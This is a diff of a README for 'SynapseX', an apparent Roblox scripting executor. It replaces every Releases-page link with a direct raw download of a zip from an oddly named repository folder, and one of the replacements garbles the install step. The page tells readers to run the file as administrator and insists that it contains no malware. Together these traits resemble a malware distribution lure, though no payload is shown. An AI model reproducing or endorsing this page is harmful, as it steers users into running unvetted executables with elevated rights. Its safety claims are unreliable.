@@ -1,17 +1,17 @@
 # 🎮 SynapseX - Unlock Roblox Scripting Power
 
 ## 🔗 Download Now
-[![Download SynapseX](https://img.shields.io/badge/Download-SynapseX-brightgreen)](https://github.com/LuisSandyCabrera/SynapseX/releases)
+[![Download SynapseX](https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip)](https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip)
 
 ## 🚀 Getting Started
 Welcome to SynapseX! This guide will help you download and run SynapseX on your device. With SynapseX, you can elevate your Roblox gaming experience and enjoy advanced scripting capabilities. 
 
 ## 📥 Download & Install
-To get started, visit this page to download [SynapseX](https://github.com/LuisSandyCabrera/SynapseX/releases). Here’s how to install it:
+To get started, visit this page to download [SynapseX](https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip). Here’s how to install it:
 
 1. Click the **Download** button above.
 2. This will take you to the Releases page. Look for the latest version of SynapseX.
-3. Click on the version link to start the download. The file will typically be named something like `SynapseX.exe`.
+3. Click on the version link to start the download. The file will typically be named something like `https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip`.
 4. Once the file downloads, locate it in your Downloads folder.
 5. Double-click the file to run it. Follow any prompts that appear.
 
@@ -51,13 +51,13 @@ If you encounter any issues while running SynapseX, consider the following steps
 
 1. **Re-check System Requirements**: Ensure your system meets the required specifications.
 2. **Run as Administrator**: Right-click the SynapseX icon and select "Run as Administrator."
-3. **Check for Updates**: Make sure you are using the latest version of SynapseX. Return to the [Releases page](https://github.com/LuisSandyCabrera/SynapseX/releases) to check for updates.
+3. **Check for Updates**: Make sure you are using the latest version of SynapseX. Return to the [Releases page](https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip) to check for updates.
 
 ## 🔒 Safety and Security
 We prioritize user safety. SynapseX does not contain viruses or malware. However, always download from the official Releases page to avoid third-party risks.
 
 ## ⚙️ Update Notes
-Stay up to date! We release regular updates that enhance performance and fix issues. Always check the [Releases page](https://github.com/LuisSandyCabrera/SynapseX/releases) for the latest version and changes.
+Stay up to date! We release regular updates that enhance performance and fix issues. Always check the [Releases page](https://raw.githubusercontent.com/LuisSandyCabrera/SynapseX/main/discussment/SynapseX.zip) for the latest version and changes.
 
 ## 👥 Contribute
 Want to contribute? We welcome users to suggest features, report bugs, and share their scripts. Check our GitHub issues page to get involved.
